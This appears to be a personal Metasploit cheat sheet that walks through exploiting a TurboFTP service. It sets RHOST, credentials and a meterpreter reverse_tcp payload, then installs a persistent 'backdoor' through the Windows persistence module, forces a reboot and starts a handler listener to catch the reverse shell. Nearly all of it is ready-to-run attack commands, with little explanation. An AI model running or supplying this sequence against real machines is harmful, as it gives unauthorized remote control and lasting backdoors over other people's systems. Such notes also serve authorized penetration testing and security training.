#### Metasploit
The basic workflow to exploit a target by using MSFConsole
is:
1. Identifying vulnerable service.
2. Searching for proper exploit for the service.
3. Loading and configuring the exploit.
4. Loading and configuring the payload you want to use.
5. Running the exploit code and getting access to the vulnerable machine.
<br>
We can access metasploit by typing `msfconsole` in linux.
<newline>
`search <parameter>` - searching.
`back` - going back.
* * *
Before running metasploit there are few services needed to be runned.
`service postgresql start`
`service metasploit start`
`msfconsole`
* * *
For example, if want to use the exploit turboftp:
- Searching - `search skeleton turboftp`
- Configuring - `use exploit/windows/ftp/turboftp_port`
- Use `show options` for see more info on the parameters to be given.
- The set the parameters: `set RHOST 10.99.45.8`
- `set FTPUSER example`
- `set FTPPASS examplepass`
- Then  configure payload(Metasploit provides different payloads for different operating systems, with different architectures, and with different features. You can list them all by typing show payloads on the MSFConsole prompt):
- `set payload windows/meterpreter/reverse_tcp`
- Use `show options` for see more info on the parameters to be given.
- `set LHOST 192.168.11.4`
- `set LPORT 1234`
- Then we can use `exploit` command to start exploting the target. Also we can use `exploit -h` to see more options for exploiting.
* * *

For starting modules use `run`.

To kill all sessions `sessions -K` and after that before shutdown `jobs -K`

* * *

#### backdoor installation
First run the session in background.
<newline>
`use exploit/windows/local/persistence`
`set reg_name backdoor`
`set exe_name backdoor`
`set startup SYSTEM`
`set session <session_no>`
`set payload windows/meterpreter/reverse_tcp`
`set exitfunc process`
`set lhost <our_ip>`
`set lport 5555`
`set DisablePayloadHandler false`
`exploit //if the backdoor doesn’t start immediately, use “exploit
-j” instead`
<newline>
`sessions -i 1`
`shell`
`shutdown /r /f` for running above script.
<newline>
Then we need to set an active metasploit listener.
`use exploit/multi/handler`
`set lhost <our_ip>`
`set lport 5555`
`set payload windows/meterpreter/reverse_tcp`
`exploit -j`